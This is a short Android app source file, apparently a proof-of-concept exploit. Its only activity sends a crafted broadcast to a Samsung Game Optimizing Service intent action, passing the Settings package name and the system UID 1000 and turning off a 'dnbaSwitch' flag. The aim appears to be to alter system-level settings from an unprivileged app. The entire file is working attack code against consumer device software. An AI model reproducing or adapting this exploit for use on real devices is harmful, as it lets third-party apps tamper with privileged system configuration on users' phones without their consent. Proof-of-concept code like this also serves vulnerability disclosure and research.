package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.android.game.gos.GAME_INFO");
        i.putExtra("packageName", "com.android.settings");
        i.putExtra("uid", 1000);
        i.putExtra("dnbaSwitch", false);
        sendBroadcast(i);
    }
}